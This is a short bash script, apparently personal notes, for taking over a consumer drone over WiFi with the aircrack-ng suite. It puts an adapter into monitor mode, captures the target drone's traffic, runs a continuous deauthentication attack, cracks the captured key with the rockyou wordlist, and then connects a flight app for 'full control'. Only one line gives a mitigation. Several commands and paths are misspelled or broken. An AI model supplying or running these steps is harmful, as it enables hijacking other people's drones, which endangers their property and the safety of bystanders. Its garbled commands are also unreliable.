#!/bin/bash
# use Kali linux; plug in WiFi adaptor (TP-Link TP-WN722N for example) with monitor mode
# best wifi cards are Alfa AWUS036H USB; Ubiquiti SRC a/b/g Cardbus; Ubuquiti SRX a/b/g ExpressCard; Aircap series USB; MiniPCIe that uses ath9k esp AR92xx and AR93xx (spectral scan)

sudo su

airmon-ng start wlan1

airmon-ng check kill

airodump-ng wlan1mon

airodump-ng -c 4 -- bssid "bssid of target drone" -w /root/Desktop/DRONE wlan1mon

# wait for airodump to show data
# open second terminal

airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack

aircrack-ng -w /root/dictionaries.rockyou.txt /root/Desktopdrone01.cap

 connect with phone for full control. Use drone flight app eg FreeFlight Pro or Freeflight Mini available in Google Play/AppleStore.

# mitigate with strong password and obscure SSID
